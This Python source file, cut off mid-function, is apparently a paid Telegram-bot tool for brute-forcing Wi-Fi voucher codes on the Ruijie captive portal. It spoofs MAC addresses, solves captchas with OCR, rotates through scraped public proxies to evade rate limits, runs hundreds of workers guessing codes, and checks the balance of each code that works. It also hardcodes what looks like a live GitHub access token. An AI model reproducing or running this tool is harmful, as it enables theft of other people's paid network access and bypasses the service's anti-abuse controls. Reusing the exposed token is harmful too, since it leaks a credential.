import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import hashlib
import datetime
import requests
import threading
import traceback
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
import base64

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

from aiohttp_socks import ProxyConnector, ProxyType

# ==================== DEBUG ====================
def dbg(msg):
    print(f"[DEBUG] {msg}", flush=True)

# ==================== SESSION FILES ====================
SESSION_FILE = "session.dat"
SESSION_KEY = "S3cRetS3ss10n!2024#Ruijie"

# ==================== GITHUB KEY SERVER ====================
GITHUB_OWNER = "kxznqt"
GITHUB_REPO = "KEY"
FILE_PATH = "key.txt"
GITHUB_TOKEN = "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"
LAST_RUN_FILE = "last_run.txt"

bcyan = "\033[1;36m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
yellow = "\033[33m"
white = "\033[37m"
reset = "\033[0m"

AUTHORIZED_ID = None
AUTHORIZED_TOKEN = None
AUTHORIZED_EXPIRY = None


# ==================== XOR SESSION ENCRYPT ====================
def _xor_bytes(data: bytes, key: str) -> bytes:
    kb = key.encode('utf-8')
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ kb[i % len(kb)])
    return bytes(out)


def save_session(user_id: str, token: str, expiry_str: str):
    """Save session (encrypted) to file for reuse."""
    try:
        payload = json.dumps({
            'id': user_id,
            'token': token,
            'expiry': expiry_str,
            'saved_at': datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'),
        })
        enc = base64.b64encode(_xor_bytes(payload.encode('utf-8'), SESSION_KEY)).decode('utf-8')
        with open(SESSION_FILE, 'w') as f:
            f.write(enc)
    except Exception as e:
        dbg(f"save_session error: {e}")


def load_session():
    """Return dict or None."""
    if not os.path.exists(SESSION_FILE):
        return None
    try:
        with open(SESSION_FILE, 'r') as f:
            enc = f.read().strip()
        if not enc:
            return None
        dec = _xor_bytes(base64.b64decode(enc.encode('utf-8')), SESSION_KEY).decode('utf-8')
        data = json.loads(dec)
        if 'id' in data and 'token' in data and 'expiry' in data:
            return data
    except Exception as e:
        dbg(f"load_session error: {e}")
    return None


def clear_session():
    try:
        if os.path.exists(SESSION_FILE):
            os.remove(SESSION_FILE)
    except Exception:
        pass


# ==================== UI ====================
def show_banner():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except Exception:
        pass
    print(f"{bcyan}=" * 55)
    print(f"   ⚡ RUIJIE  ASYNC EXTREME  ⚡   ")
    print(f"        Telegram@khzisme     ")
    print(f"{bcyan}=" * 55 + f"{reset}")


def check_time_integrity():
    now = datetime.datetime.now()
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE, 'r') as f:
                last_run_time = datetime.datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
            if now < last_run_time:
                print(f"\n{bred}[!] ERROR: TIME ROLLBACK DETECTED! STOPPING...{reset}")
                os._exit(0)
        except Exception:
            pass
    try:
        with open(LAST_RUN_FILE, 'w') as f:
            f.write(now.strftime('%Y-%m-%d %H:%M:%S'))
    except Exception:
        pass


def show_expiry_only(expiry_str, source="session"):
    """Display only expiry time, NO token, NO ID."""
    try:
        exp = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    except Exception:
        exp = datetime.datetime(2099, 12, 31)

    now = datetime.datetime.now()
    remaining = exp - now
    if remaining.total_seconds() <= 0:
        return False

    days = remaining.days
    hours, rem = divmod(remaining.seconds, 3600)
    minutes, _ = divmod(rem, 60)

    parts = []
    if days > 0:
        parts.append(f"{days}d")
    if hours > 0 or days > 0:
        parts.append(f"{hours}h")
    parts.append(f"{minutes}m")
    time_str = " ".join(parts)

    tag = "Session" if source == "session" else "Verified"
    print(f"{bgreen}[+] Access Granted! ({tag}){reset}")
    print(f"{yellow}[*] Expires : {expiry_str}{reset}")
    print(f"{yellow}[*] Left    : {time_str}{reset}")
    print("==========================================================")
    sys.stdout.flush()
    return True


# ==================== GITHUB FETCH ====================
def fetch_key_file():
    """Return list of (id, token, expiry_str) from GitHub key.txt"""
    url = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{FILE_PATH}"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}" if GITHUB_TOKEN else "",
        "Accept": "application/vnd.github.v3.raw"
    }
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            dbg(f"fetch_key_file HTTP {r.status_code}")
            return None
        rows = []
        for line in r.text.strip().split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = [p.strip().strip('"').strip("'") for p in line.split(',')]
            if len(parts) < 2:
                continue
            tid = parts[0]
            token = parts[1]
            expiry = parts[2] if len(parts) > 2 else "2099-12-31 23:59:59"
            rows.append((tid, token, expiry))
        return rows
    except requests.RequestException as e:
        dbg(f"fetch_key_file error: {e}")
        return None


def find_entry_by_id(rows, user_id: str):
    if not rows:
        return None
    for tid, token, expiry in rows:
        if tid == user_id:
            return (tid, token, expiry)
    return None


# ==================== MAIN AUTH ====================
def check_approval():
    """
    Priority:
      1) Try saved session (silent auto-login).
         - If still valid → check expiry only, no ID prompt.
      2) Else ask ID once, verify vs GitHub, save session.
    """
    global AUTHORIZED_ID, AUTHORIZED_TOKEN, AUTHORIZED_EXPIRY

    check_time_integrity()
    show_banner()

    # ---------- STEP 1: Try saved session ----------
    sess = load_session()
    if sess:
        user_id = sess.get('id')
        token = sess.get('token')
        expiry_str = sess.get('expiry')

        rows = fetch_key_file()
        if rows is not None:
            entry = find_entry_by_id(rows, user_id)
            if entry:
                tid, gtoken, gexpiry = entry
                if gtoken != token:
                    dbg("Git token changed, refreshing session")
                    token = gtoken
                    expiry_str = gexpiry
                    save_session(user_id, token, expiry_str)

                try:
                    exp = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                except Exception:
                    exp = datetime.datetime(2099, 12, 31)
                if datetime.datetime.now() <= exp and token and ':' in token:
                    AUTHORIZED_ID = user_id
                    AUTHORIZED_TOKEN = token
                    AUTHORIZED_EXPIRY = expiry_str
                    show_expiry_only(expiry_str, source="session")
                    time.sleep(1.0)
                    return
                else:
                    dbg("Session expired on server → clearing")
                    clear_session()
            else:
                dbg("Session ID no longer authorized → clearing")
                clear_session()
        else:
            # GitHub unreachable — fall back to using saved session blindly (offline grace)
            try:
                exp = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
            except Exception:
                exp = datetime.datetime(2099, 12, 31)
            if datetime.datetime.now() <= exp and token and ':' in token:
                AUTHORIZED_ID = user_id
                AUTHORIZED_TOKEN = token
                AUTHORIZED_EXPIRY = expiry_str
                show_expiry_only(expiry_str, source="session")
                time.sleep(1.0)
                return

    # ---------- STEP 2: Ask ID (only once) ----------
    print(f"\n{white}First-time Setup · Telegram ID Authentication{reset}")
    print(f"{yellow}[*] Enter your Telegram ID once (will be remembered){reset}")
    print(f"{yellow}[*] Example: 123456789{reset}\n")
    sys.stdout.flush()

    try:
        tid_input = input(f"{bcyan}🆔 Telegram ID: {reset}").strip()
    except (EOFError, KeyboardInterrupt):
        print(f"\n{bred}[!] Cancelled.{reset}")
        os._exit(0)

    if not tid_input.isdigit():
        print(f"{bred}[!] Invalid ID. Must be numeric.{reset}")
        os._exit(0)

    user_id = tid_input
    print(f"\n{white}Checking authorization...{reset}")
    sys.stdout.flush()

    rows = fetch_key_file()
    if rows is None:
        print(f"{bred}[!] Cannot verify. Online check required.{reset}")
        os._exit(0)

    entry = find_entry_by_id(rows, user_id)
    if not entry:
        print(f"{bred}[!] YOUR TELEGRAM ID IS NOT AUTHORIZED!{reset}")
        print(f"{yellow}[+] Contact @khzisme to get access{reset}")
        os._exit(0)

    tid, token, expiry_str = entry
    try:
        exp = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    except Exception:
        exp = datetime.datetime(2099, 12, 31)

    if datetime.datetime.now() > exp:
        print(f"{bred}[!] YOUR ID HAS EXPIRED!{reset}")
        print(f"{yellow}[+] Expired : {expiry_str}{reset}")
        os._exit(0)

    if not token or ':' not in token:
        print(f"{bred}[!] Bot token for your ID is invalid.{reset}")
        os._exit(0)

    save_session(user_id, token, expiry_str)

    AUTHORIZED_ID = user_id
    AUTHORIZED_TOKEN = token
    AUTHORIZED_EXPIRY = expiry_str

    show_expiry_only(expiry_str, source="verified")
    time.sleep(1.0)


def get_bot_token():
    if AUTHORIZED_TOKEN:
        return AUTHORIZED_TOKEN
    print(f"{bred}[!] No authorized token available.{reset}")
    sys.exit(1)


# ==================== END AUTH SYSTEM ====================


# ---------------- CONFIGURATION ----------------
TIMEOUT_SEC = 20
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 300
MANUAL_CONCURRENCY = 15
RETRY_CONCURRENCY = 30
BALANCE_WORKERS = 30

TOKEN_FILE = "bot_token.txt"
PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http&page=1&limit=500&sort_by=responseTime&sort_type=asc",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]


# ---------- Web server ----------
def run_web_server():
    port = int(os.environ.get("PORT", 8080))

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is alive")

        def log_message(self, format, *args):
            pass

    try:
        server = HTTPServer(("0.0.0.0", port), Handler)
        server.serve_forever()
    except Exception as e:
        print(f"[WebServer] Error: {e}")


def start_web_server():
    t = threading.Thread(target=run_web_server, daemon=True)
    t.start()


# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.good_proxies = []
        self.index = 0
        self.good_index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str):
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy = 'http://' + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")

    def reload(self):
        self.load()

    def clear_file(self):
        try:
            with open(self.file_path, 'w') as f:
                f.write('')
        except Exception:
            pass
        self.proxies = []
        self.bad_proxies.clear()
        self.good_proxies.clear()
        self.index = 0

    def add_proxies(self, new_proxies):
        normalized = [self._normalize(p) for p in new_proxies if p.strip()]
        normalized = [p for p in normalized if p]
        existing = set(self.proxies)
        added = []
        for p in normalized:
            if p not in existing:
                added.append(p)
                existing.add(p)
        if added:
            try:
                with open(self.file_path, 'a') as f:
                    for p in added:
                        f.write(p + '\n')
            except Exception as e:
                print(f"[ProxyManager] Append error: {e}")
        self.reload()
        return len(added)

    def mark_good(self, proxy: str):
        if proxy and proxy not in self.good_proxies:
            self.good_proxies.append(proxy)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            if self.good_proxies and random.random() < 0.8:
                proxy = self.good_proxies[self.good_index % len(self.good_proxies)]
                self.good_index += 1
                return proxy
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def get_random(self):
        async with self.lock:
            if not self.proxies:
                return None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            return random.choice(available) if available else None

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)
            if proxy in self.good_proxies:
                try:
                    self.good_proxies.remove(proxy)
                except ValueError:
                    pass

    def stats(self):
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad


_proxy_manager = None


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


# ==================== OCR ====================
_ocr_instance = None
_ocr_lock = threading.Lock()


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ---------------- PER-USER DATA ----------------
user_scanners = {}
user_proxy_checks = {}
user_manual_balance = {}


def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            'mode': 'num6',
            'char_set': '012345678',
            'code_len': 6,
            'start_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'stats': {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()},
            'valid_codes': [],
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'menu_msg_id': None,
            'state': None,
            'num_workers': NUM_WORKERS,
            'balance_queue': asyncio.Queue(),
            'balance_sem': None,
        }
    return user_scanners[user_id]


# ---------------- UTILITIES ----------------
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False, timeout=5) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return None, None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query['mac'] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, timeout=10, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=10, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None


def create_connector_for_proxy(proxy: str):
    return ProxyConnector.from_url(proxy, ssl=False)


# ==================== BALANCE CHECKER ====================
async def fetch_balance_with_proxy(active_token: str, proxy: str, timeout: int = 3):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    if not isinstance(inner, dict):
                        return False, f"unexpected format"
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"{type(e).__name__}"
    return False, "unknown"


async def fetch_balance_direct(active_token: str, timeout: int = 5):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    if not isinstance(inner, dict):
                        return False, f"unexpected format"
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Net/Other: {type(e).__name__}"
    return False, "unknown"


async def fetch_balance_fast(active_token: str, preferred_proxy: str = None):
    pm = get_proxy_manager()

    if preferred_proxy:
        ok, result = await fetch_balance_with_proxy(active_token, preferred_proxy, timeout=3)
        if ok:
            pm.mark_good(preferred_proxy)
            return (result, "proxy")
        if result in ("ClientConnectorError", "ServerTimeoutError",
                      "ClientOSError", "ConnectionResetError",
                      "TimeoutError", "ClientProxyConnectionError",
                      "ServerDisconnectedError", "ClientConnectionError"):
            await pm.mark_bad(preferred_proxy)

    if pm.good_proxies:
        for proxy in random.sample(pm.good_proxies, min(1, len(pm.good_proxies))):
            if proxy == preferred_proxy:
                continue
            ok, result = await fetch_balance_with_proxy(active_token, proxy, timeout=3)
            if ok:
                pm.mark_good(proxy)
                return (result, "proxy")
            if result in ("ClientConnectorError", "ServerTimeoutError",
                          "ClientOSError", "ConnectionResetError",
                          "TimeoutError", "ClientProxyConnectionError"):
                await pm.mark_bad(proxy)

    ok, result = await fetch_balance_direct(active_token, timeout=5)
    return (result if ok else f"❌ {result}", "direct")


async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    await ud['balance_queue'].put((active_token, code, proxy_str))


# ==================== BALANCE WORKER ====================
async def balance_worker(user_id: int, worker_id: int):
    ud = get_user_data(user_id)
    while not ud['stop_event'].is_set():
        try:
            try:
                active_token, code, proxy_str = await asyncio.wait_for(
                    ud['balance_queue'].get(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue

            if ud['stop_event'].is_set():
                break

            try:
                balance_str, source = await fetch_balance_fast(active_token, preferred_proxy=proxy_str)
            except Exception as e:
                balance_str = f"❌ {type(e).__name__}"
                source = "❌"

            for item in ud['valid_codes']:
                if item['code'] == code:
                    item['balance_str'] = balance_str
                    item['source'] = source
                    break
            ud['dash_update_event'].set()
            ud['balance_queue'].task_done()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.1)


# ==================== CHECK SINGLE ACCESS CODE ====================
async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return 'failed'

    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    for _ in range(2):
        if ud['stop_event'].is_set():
            return 'failed'
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            continue
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=8) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue
                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=10) as l_resp:
                    ud['stats']['tried'] += 1
                    l_text = (await l_resp.text()).lower()
                    if 'request limited' in l_text:
                        return 'limit'
                    if '"success":true' in l_text:
                        ud['stats']['hits'] += 1
                        pm = get_proxy_manager()
                        pm.mark_good(current_proxy)
                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        active_token = token_match.group(1) if token_match else None
                        entry = {
                            'code': code,
                            'balance_str': '...fetching...',
                            'source': '...',
                            'active_token': active_token,
                        }
                        if not any(item['code'] == code for item in ud['valid_codes']):
                            ud['valid_codes'].append(entry)
                        ud['dash_update_event'].set()
                        if active_token:
                            await ud['balance_queue'].put((active_token, code, current_proxy))
                        else:
                            entry['balance_str'] = "❌ no token"
                            entry['source'] = "❌"
                            ud['dash_update_event'].set()
                        return 'hit'
                    elif "expired" in l_text:
                        ud['stats']['expired'] += 1
                        return 'expired'
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud['stats']['limits'] += 1
                        if code not in ud['limit_codes']:
                            ud['limit_codes'].append(code)
                        ud['recent_logs'].append(f"⚠️ LIMIT: {code}")
                        return 'limit'
                    return 'failed'
        except Exception:
            return 'failed'
    return 'failed'


# ==================== WORKER ====================
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue
        proxy_connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(
            connector=proxy_connector,
            connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)
        ) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0
            while not ud['stop_event'].is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 2:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.3)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0
                code = None
                for _ in range(10):
                    if ud['mode'] == "custom" and ud['start_digit'] is not None:
                        body_chars = random.choices(ud['char_set'], k=ud['code_len'] - 1)
                        random.shuffle(body_chars)
                        code = ud['start_digit'] + ''.join(body_chars)
                    else:
                        code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
                    if code not in ud['tried_codes']:
                        ud['tried_codes'].add(code)
                        break
                if code is None or ud['stop_event'].is_set():
                    break
                ud['CURRENT_CODE'] = code
                result = await check_single_access_code(session, code, current_session_id,
                                                        login_url, captcha_base_url, verify_url,
                                                        headers, user_id, proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                if result == 'limit':
                    current_session_id = None


# ==================== LIVE DASHBOARD ====================
async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    last_tried = 0
    last_time = time.time()
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.3)
            continue
        try:
            stats = ud['stats']
            elapsed = time.time() - stats['start_time']
            speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
            now = time.time()
            dt = now - last_time
            inst_speed = ((stats['tried'] - last_tried) / dt) * 60 if dt > 0 else 0
            last_tried = stats['tried']
            last_time = now
            proxy_total, proxy_active = pm.stats()
            hit_list = []
            fetching_count = 0
            for item in ud['valid_codes']:
                c = item['code']
                balance = item.get('balance_str', '...fetching...')
                if balance.startswith('...'):
                    fetching_count += 1
                src = item.get('source', '...')
                src_icon = "🌐" if src == "proxy" else ("📡" if src == "direct" else "⏳")
                hit_list.append(f"`{c}` {balance} {src_icon}")
            hit_str = "\n".join(hit_list) if hit_list else "None yet"
            text = (
                f"⚡ Scanner Running ⚡\n"
                f"Thank for using By Telegram @khzisme\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🏹 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: `{ud['CURRENT_CODE']}`\n"
                f"🔥 Hits: {stats['hits']}\n"
                f"⏳ Fetching: {fetching_count}\n"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m (now {inst_speed:.1f})\n"
                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
                f"👷 Workers: {ud['num_workers']}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔥 **Hit Codes**:\n{hit_str}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
            )
            if ud['recent_logs']:
                last_log = ud['recent_logs'][-1]
                text += f"🔥 Last: {last_log}\n"
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🛑 Stop", callback_data="stop_scan")]
            ])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud['dash_msg_id'],
                text=text,
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=5.0)
            ud['dash_update_event'].clear()
        except asyncio.TimeoutError:
            pass


# ==================== AUTO RETRY ====================
def _is_pending(item):
    if not item:
        return False
    bs = item.get('balance_str', '')
    if bs.startswith('...'):
        return True
    if bs.startswith('❌') or bs.startswith('⚠️'):
        return True
    return False


async def auto_retry_pending(ud, context, user_id):
    pending = [it for it in ud['valid_codes'] if _is_pending(it)]
    if not pending:
        return

    total = len(pending)
    try:
        retry_msg = await context.bot.send_message(
            user_id,
            f"🔄 Auto retrying {total} pending/error balance(s)...\n"
            f"⚡ Concurrency: {RETRY_CONCURRENCY}"
        )
    except Exception:
        retry_msg = None

    sem = asyncio.Semaphore(RETRY_CONCURRENCY)
    lock = asyncio.Lock()
    done_count = {'n': 0}
    success_count = {'n': 0}

    async def _retry_one(it):
        async with sem:
            token = it.get('active_token')
            if not token:
                it['balance_str'] = "❌ no token"
                it['source'] = "❌"
            else:
                try:
                    bal, src = await fetch_balance_fast(token, preferred_proxy=None)
                    it['balance_str'] = bal
                    it['source'] = src
                    if not bal.startswith('❌') and not bal.startswith('⚠️'):
                        async with lock:
                            success_count['n'] += 1
                except Exception as e:
                    it['balance_str'] = f"❌ {type(e).__name__}"
                    it['source'] = "❌"
            async with lock:
                done_count['n'] += 1
                if done_count['n'] % 3 == 0 or done_count['n'] == total:
                    try:
                        if retry_msg:
                            await context.bot.edit_message_text(
                                chat_id=user_id,
                                message_id=retry_msg.message_id,
                                text=(
                                    f"🔄 Auto retry: {done_count['n']}/{total}\n"
                                    f"✅ Success: {success_count['n']}"
                                )
                            )
                    except Exception:
                        pass

    tasks = [asyncio.create_task(_retry_one(it)) for it in pending]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        if retry_msg:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=retry_msg.message_id,
                text=f"✅ Auto retry done. {total} codes processed, {success_count['n']} success."
            )
    except Exception:
        pass


# ==================== START SCANNER ====================
async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"⚠️ **No proxies loaded!**\n\n",
            parse_mode=ParseMode.MARKDOWN
        )

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    ud['balance_queue'] = asyncio.Queue()
    ud['dash_update_event'].clear()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    worker_count = ud.get('num_workers', NUM_WORKERS)
    for i in range(worker_count):
